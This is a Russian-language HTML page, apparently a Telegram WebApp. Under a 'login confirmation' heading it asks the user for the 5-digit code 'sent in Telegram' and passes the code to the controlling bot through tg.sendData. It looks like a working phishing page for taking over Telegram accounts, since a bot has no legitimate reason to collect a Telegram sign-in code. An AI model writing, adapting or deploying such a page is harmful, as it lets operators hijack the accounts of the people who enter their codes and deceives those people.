<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ввод кода подтверждения</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: url('https://i.imgur.com/fI9iKFj.jpeg') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
            backdrop-filter: blur(4px);
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 32px;
            padding: 32px 24px;
            box-shadow: 0 20px 35px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(0);
        }
        h1 {
            font-size: 26px;
            margin-bottom: 8px;
            color: #1f2937;
        }
        p {
            color: #4b5563;
            margin-bottom: 28px;
            font-size: 15px;
        }
        .code-input {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 32px;
        }
        .code-input input {
            width: 56px;
            height: 70px;
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 20px;
            outline: none;
            transition: all 0.2s;
            background: white;
            color: #1e293b;
        }
        .code-input input:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.3);
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 40px;
            padding: 16px 24px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
        }
        button:active {
            transform: scale(0.98);
        }
        button:disabled {
            opacity: 0.7;
            transform: none;
            cursor: not-allowed;
        }
        .error {
            color: #e53e3e;
            font-size: 14px;
            margin-top: 20px;
            display: none;
            background: rgba(229,62,62,0.1);
            padding: 8px;
            border-radius: 12px;
        }
        .success {
            color: #38a169;
            font-size: 14px;
            margin-top: 20px;
            display: none;
            background: rgba(56,161,105,0.1);
            padding: 8px;
            border-radius: 12px;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-left: 10px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @media (max-width: 480px) {
            .code-input input {
                width: 48px;
                height: 60px;
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 Подтверждение входа</h1>
    <p>Введите 5-значный код, отправленный в Telegram</p>
    <div class="code-input">
        <input type="text" maxlength="1" id="digit1" autofocus>
        <input type="text" maxlength="1" id="digit2">
        <input type="text" maxlength="1" id="digit3">
        <input type="text" maxlength="1" id="digit4">
        <input type="text" maxlength="1" id="digit5">
    </div>
    <button id="submitBtn">Подтвердить</button>
    <div class="error" id="errorMsg"></div>
    <div class="success" id="successMsg">✅ Код отправлен!</div>
</div>

<script>
    let tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    const inputs = [
        document.getElementById('digit1'),
        document.getElementById('digit2'),
        document.getElementById('digit3'),
        document.getElementById('digit4'),
        document.getElementById('digit5')
    ];

    // Автоматический переход между полями
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (input.value.length === 1 && index < 4) {
                inputs[index + 1].focus();
            }
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });

    const submitBtn = document.getElementById('submitBtn');
    const errorDiv = document.getElementById('errorMsg');
    const successDiv = document.getElementById('successMsg');

    submitBtn.addEventListener('click', () => {
        let code = '';
        for (let i = 0; i < 5; i++) {
            code += inputs[i].value;
        }
        if (code.length !== 5 || !/^\d+$/.test(code)) {
            errorDiv.style.display = 'block';
            errorDiv.textContent = '❌ Введите 5 цифр';
            return;
        }
        errorDiv.style.display = 'none';
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Отправка <span class="loading"></span>';

        // Отправляем данные боту
        tg.sendData(JSON.stringify({
            action: 'code_input',
            code: code
        }));

        successDiv.style.display = 'block';
        setTimeout(() => {
            tg.close();
        }, 1500);
    });

    // Обработка кнопки "Назад"
    tg.onEvent('backButtonClicked', () => {
        tg.close();
    });
</script>
</body>
</html>
